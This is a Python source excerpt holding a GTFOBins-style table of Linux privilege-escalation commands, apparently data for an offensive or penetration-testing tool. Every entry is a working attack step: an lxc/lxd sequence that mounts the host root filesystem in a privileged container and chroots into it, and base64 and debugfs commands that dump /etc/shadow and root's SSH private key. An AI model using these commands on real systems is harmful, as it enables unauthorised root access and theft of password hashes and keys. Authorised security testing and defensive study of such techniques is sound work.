...
GTFOBINS: dict[str, dict[str, list[str]]] = {
    ...
    "lxc": {
        "shell": [
            "lxc image import ./alpine.tar.gz --alias privesc  # or: lxd init; download-build alpine",
            "lxc init privesc r00t -c security.privileged=true",
            "lxc config device add r00t host disk source=/ path=/mnt/root recursive=true",
            "lxc start r00t; lxc exec r00t /bin/sh   # then: chroot /mnt/root sh",
        ],
        "note": ["Membership in the `lxd`/`lxc` group is root-equivalent: launch a privileged container, bind-mount host / into it, chroot. Build the alpine image with build-alpine if none is present."],
    },
    "lxd": {
        "shell": [
            "lxd init --auto; lxc image import alpine.tar.gz --alias x",
            "lxc init x r -c security.privileged=true; lxc config device add r d disk source=/ path=/mnt/root recursive=true",
            "lxc start r; lxc exec r /bin/sh; chroot /mnt/root sh",
        ],
        "note": ["Alias of the lxc-group escalation — see `lxc`."],
    },
    "base64": {
        "sudo": ["sudo base64 /etc/shadow | base64 -d"],
        "suid": ["./base64 /etc/shadow | base64 --decode"],
        "file-read": ["base64 /etc/shadow | base64 -d", "base64 /root/.ssh/id_rsa | base64 -d"],
        "note": ["Also a no-network file-transfer bridge: base64 -w0 file on the source, paste, base64 -d > file on the destination."],
    },
    "debugfs": {
        "shell": ["debugfs /dev/sda1   # then: cat /etc/shadow, cat /root/.ssh/id_rsa"],
        "file-read": ["debugfs -R 'cat /etc/shadow' /dev/sda1", "debugfs -R 'cat /root/.ssh/id_rsa' /dev/sda1"],
        "note": ["Membership in the `disk` group gives raw block-device read — dump /etc/shadow and root's keys without being root."],
    },
}
